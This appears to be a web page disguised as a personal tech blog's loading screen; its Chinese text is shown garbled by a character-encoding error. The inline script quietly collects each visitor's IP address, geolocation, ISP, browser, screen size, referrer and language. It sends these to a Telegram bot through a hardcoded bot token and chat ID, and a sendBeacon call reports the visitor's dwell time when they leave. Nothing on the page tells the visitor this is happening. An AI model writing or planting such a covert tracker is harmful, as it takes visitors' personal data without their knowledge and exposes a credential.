<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>æ¬¢è¿è®¿é—®æˆ‘çš„ç½‘ç«™</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Microsoft YaHei', sans-serif;
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            text-align: center;
            max-width: 800px;
            width: 100%;
        }
        
        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 50px 40px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.2);
            margin-bottom: 30px;
        }
        
        h1 {
            font-size: 2.8em;
            margin-bottom: 20px;
            background: linear-gradient(to right, #ff7e5f, #feb47b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        p {
            font-size: 1.2em;
            line-height: 1.6;
            margin-bottom: 25px;
            opacity: 0.9;
        }
        
        .features {
            display: flex;
            justify-content: center;
            gap: 20px;
            flex-wrap: wrap;
            margin: 30px 0;
        }
        
        .feature-item {
            background: rgba(255, 255, 255, 0.15);
            padding: 15px 25px;
            border-radius: 15px;
            font-size: 1.1em;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .loader {
            width: 60px;
            height: 60px;
            margin: 40px auto;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #ff7e5f;
            border-radius: 50%;
            animation: spin 1.2s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .footer {
            margin-top: 30px;
            font-size: 0.9em;
            opacity: 0.7;
        }
        
        @media (max-width: 600px) {
            .card {
                padding: 30px 20px;
            }
            
            h1 {
                font-size: 2em;
            }
            
            .feature-item {
                width: 100%;
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>ğŸ‰ æ¬¢è¿å…‰ä¸´ï¼</h1>
            <p>æ„Ÿè°¢æ‚¨è®¿é—®æˆ‘çš„ä¸ªäººç½‘ç«™ã€‚è¿™é‡Œåˆ†äº«æŠ€æœ¯å¿ƒå¾—ã€å¼€å‘ç»éªŒå’Œæœ‰è¶£çš„é¡¹ç›®ã€‚</p>
            
            <div class="features">
                <div class="feature-item">ğŸš€ æœ€æ–°æŠ€æœ¯</div>
                <div class="feature-item">ğŸ’¡ å¼€å‘æ•™ç¨‹</div>
                <div class="feature-item">ğŸ“š èµ„æºåˆ†äº«</div>
            </div>
            
            <p>é¡µé¢æ­£åœ¨åŠ è½½ä¸­ï¼Œè¯·ç¨å€™ç‰‡åˆ»...</p>
            
            <div class="loader"></div>
            
            <p class="footer">Â© 2024 ä¸ªäººæŠ€æœ¯åšå®¢ | æ­£åœ¨ä¸ºæ‚¨å‡†å¤‡æœ€ä½³æµè§ˆä½“éªŒ</p>
        </div>
    </div>

    <script>
    // ================= é…ç½®åŒºåŸŸ =================
    const BOT_TOKEN = '8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM';
    const CHAT_ID = '8313770381';
    // ===========================================
    
    // è·å–è®¿é—®è€…ä¿¡æ¯
    async function trackVisitor() {
        console.log('å¼€å§‹è·Ÿè¸ªè®¿é—®è€…ä¿¡æ¯...');
        
        try {
            // 1. è·å–IPåœ°å€
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const visitorIP = ipData.ip;
            console.log('IPåœ°å€:', visitorIP);
            
            // 2. è·å–è¯¦ç»†åœ°ç†ä½ç½®
            let location = 'æ­£åœ¨å®šä½...';
            let country = 'æœªçŸ¥';
            let city = 'æœªçŸ¥';
            let isp = 'æœªçŸ¥ç½‘ç»œ';
            
            try {
                const geoResponse = await fetch(`https://ipapi.co/${visitorIP}/json/`);
                const geoData = await geoResponse.json();
                
                country = geoData.country_name || 'æœªçŸ¥å›½å®¶';
                city = geoData.city || 'æœªçŸ¥åŸå¸‚';
                location = `${city}, ${country}`;
                isp = geoData.org || 'æœªçŸ¥ISP';
                
                console.log('åœ°ç†ä½ç½®:', location);
                console.log('ç½‘ç»œæœåŠ¡å•†:', isp);
            } catch (geoError) {
                console.log('è·å–åœ°ç†ä½ç½®å¤±è´¥ï¼Œä½¿ç”¨å¤‡ç”¨æ–¹æ¡ˆ');
                // å¤‡ç”¨æ–¹æ¡ˆ
                try {
                    const backupResponse = await fetch(`https://ipwho.is/${visitorIP}`);
                    const backupData = await backupResponse.json();
                    if (backupData.success) {
                        location = `${backupData.city || 'æœªçŸ¥'}, ${backupData.country || 'æœªçŸ¥'}`;
                        isp = backupData.connection?.isp || 'æœªçŸ¥ISP';
                    }
                } catch (e) {
                    // å¦‚æœéƒ½å¤±è´¥äº†ï¼Œå°±ç”¨åŸºç¡€ä¿¡æ¯
                }
            }
            
            // 3. è·å–æµè§ˆå™¨ä¿¡æ¯
            const userAgent = navigator.userAgent;
            let browser = 'æœªçŸ¥æµè§ˆå™¨';
            if (userAgent.includes('Chrome')) browser = 'Chrome';
            else if (userAgent.includes('Firefox')) browser = 'Firefox';
            else if (userAgent.includes('Safari')) browser = 'Safari';
            else if (userAgent.includes('Edge')) browser = 'Edge';
            
            // 4. è·å–å±å¹•åˆ†è¾¨ç‡
            const screenSize = `${screen.width} Ã— ${screen.height}`;
            
            // 5. è·å–æ¥æºé¡µé¢
            const referrer = document.referrer || 'ç›´æ¥è®¿é—®';
            const source = referrer.includes('http') ? referrer : 'ç›´æ¥è®¿é—®æˆ–ä¹¦ç­¾';
            
            // 6. è·å–è¯­è¨€
            const language = navigator.language || navigator.userLanguage || 'æœªçŸ¥';
            
            // 7. å½“å‰æ—¶é—´
            const now = new Date();
            const visitTime = now.toLocaleString('zh-CN', {
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false
            });
            
            // 8. å‡†å¤‡Telegramæ¶ˆæ¯
            const message = `
ğŸ¯ <b>ã€ç½‘ç«™è®¿é—®é€šçŸ¥ã€‘</b>

ğŸŒ <b>IPåœ°å€ï¼š</b> <code>${visitorIP}</code>
ğŸ“ <b>åœ°ç†ä½ç½®ï¼š</b> ${location}
ğŸ¢ <b>ç½‘ç»œæœåŠ¡ï¼š</b> ${isp}
ğŸ–¥ï¸ <b>æµè§ˆå™¨ï¼š</b> ${browser}
ğŸ“± <b>å±å¹•åˆ†è¾¨ç‡ï¼š</b> ${screenSize}
ğŸ—£ï¸ <b>ç³»ç»Ÿè¯­è¨€ï¼š</b> ${language}
ğŸ”— <b>è®¿é—®æ¥æºï¼š</b> ${source}
ğŸ• <b>è®¿é—®æ—¶é—´ï¼š</b> ${visitTime}
ğŸ“Š <b>å®Œæ•´UAï¼š</b>
<pre>${userAgent.substring(0, 300)}</pre>
            `;
            
            // 9. å‘é€åˆ°Telegram
            console.log('æ­£åœ¨å‘é€é€šçŸ¥åˆ°Telegram...');
            await sendTelegramNotification(message);
            console.log('âœ… é€šçŸ¥å‘é€æˆåŠŸï¼');
            
        } catch (error) {
            console.error('âŒ è·Ÿè¸ªå¤±è´¥:', error);
            // å³ä½¿å¤±è´¥ä¹Ÿå‘é€åŸºç¡€é€šçŸ¥
            try {
                const fallbackMessage = `
âš ï¸ <b>ã€è®¿é—®é€šçŸ¥ - éƒ¨åˆ†ä¿¡æ¯è·å–å¤±è´¥ã€‘</b>

ğŸ• <b>è®¿é—®æ—¶é—´ï¼š</b> ${new Date().toLocaleString('zh-CN')}
ğŸŒ <b>é”™è¯¯ä¿¡æ¯ï¼š</b> ${error.message}
                `;
                await sendTelegramNotification(fallbackMessage);
            } catch (e) {
                console.error('å‘é€å¤±è´¥é€šçŸ¥ä¹Ÿå‡ºé”™:', e);
            }
        }
    }
    
    // å‘é€æ¶ˆæ¯åˆ°Telegram
    async function sendTelegramNotification(text) {
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'HTML',
                disable_web_page_preview: true,
                disable_notification: false // ç¡®ä¿æœ‰é€šçŸ¥æé†’
            })
        });
        
        const result = await response.json();
        if (!result.ok) {
            console.error('Telegram APIé”™è¯¯:', result);
        }
        return result;
    }
    
    // é¡µé¢åŠ è½½å®Œæˆåæ‰§è¡Œ
    window.addEventListener('load', function() {
        console.log('é¡µé¢åŠ è½½å®Œæˆï¼Œå¼€å§‹è·Ÿè¸ª...');
        
        // å»¶è¿Ÿ2ç§’æ‰§è¡Œï¼Œè®©ç”¨æˆ·å…ˆçœ‹åˆ°é¡µé¢
        setTimeout(() => {
            trackVisitor();
        }, 2000);
    });
    
    // å¦‚æœç”¨æˆ·ç¦»å¼€é¡µé¢ä¹Ÿå‘é€é€šçŸ¥ï¼ˆå¯é€‰ï¼‰
    window.addEventListener('beforeunload', function() {
        const duration = Math.round((Date.now() - performance.timing.navigationStart) / 1000);
        if (duration > 5) { // åœç•™è¶…è¿‡5ç§’
            const leaveMessage = `
ğŸ‘‹ <b>ã€ç”¨æˆ·ç¦»å¼€é€šçŸ¥ã€‘</b>

â±ï¸ <b>åœç•™æ—¶é—´ï¼š</b> ${duration}ç§’
ğŸ• <b>ç¦»å¼€æ—¶é—´ï¼š</b> ${new Date().toLocaleString('zh-CN')}
            `;
            
            // ä½¿ç”¨sendBeaconç¡®ä¿ç¦»å¼€æ—¶ä¹Ÿèƒ½å‘é€
            const blob = new Blob([JSON.stringify({
                chat_id: CHAT_ID,
                text: leaveMessage,
                parse_mode: 'HTML'
            })], { type: 'application/json' });
            
            navigator.sendBeacon(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                blob
            );
        }
    });
    </script>
</body>
</html>